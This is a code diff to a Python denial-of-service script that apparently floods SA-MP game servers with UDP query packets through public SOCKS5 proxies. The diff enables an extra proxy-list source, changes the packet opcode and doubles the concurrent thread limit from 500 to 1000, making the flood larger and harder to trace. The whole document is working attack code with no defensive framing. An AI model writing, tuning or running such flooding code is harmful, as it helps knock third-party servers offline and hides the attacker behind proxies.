@@ -9,7 +9,7 @@ import time
 import os
 
 proxy_api_urls = [
-    #"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
+    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
     "https://www.proxy-list.download/api/v1/get?type=socks5",
     "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
@@ -73,7 +73,7 @@ def worker():
     while time.time() - start_time < times:
         if proxy not in blacklisted_proxies:
             try:
-                payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'
+                payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'p'
                 udp.sendto(payload, target)
 
             except Exception as error:
@@ -82,7 +82,7 @@ def worker():
     return
 
 while time.time() - start_time < times:
-    while threading.active_count() >= 500:
+    while threading.active_count() >= 1000:
         pass
     threading.Thread(target=worker).start()
 
